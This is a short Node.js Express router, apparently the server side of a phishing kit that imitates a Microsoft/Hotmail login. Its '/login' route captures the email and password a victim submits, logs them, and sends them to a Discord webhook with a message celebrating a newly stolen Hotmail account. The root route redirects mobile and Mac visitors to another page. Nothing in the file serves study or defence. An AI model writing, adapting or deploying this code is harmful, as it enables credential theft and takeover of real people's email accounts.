const axios = require("axios");

const useragent = require('express-useragent');
const express = require('express');
const router = express.Router();

router.get('/', (req, res) => {
  const { isMobile, isMac } = req.useragent;

  if (isMobile || isMac) {
    return res.redirect('/links');
  }

  res.render('index', { titulo: "Página Inicial" });
});



router.get('/microsoft', (req, res) => {
  res.render('microsoft', { titulo: "Página Inicial" });
});

router.post("/login", async (req, res) => {
    const { username, password, dontShowAgain, choice } = req.body;

    console.log("Usuário:", username);
    console.log("Senha:", password);

    const webhookUrl = "https://discord.com/api/webhooks/";

    const payload = {
        content: `📬 **Ops Uma nova conta HOTMAIL acabou de chegar!**\n\n👤 E-mail: **${username}**\n💬 Senha: ${password}`
    };

    try {
        await axios.post(webhookUrl, payload);
        res.json({ status: "OK" });
    } catch (err) {
        console.error("Erro:", err);
        res.status(500).json({ error: "Falha ao enviar para webhook" });
    }
});

router.get('/links', (req, res) => {
  res.render('links', { titulo: "Página Inicial" });
});




module.exports = router;
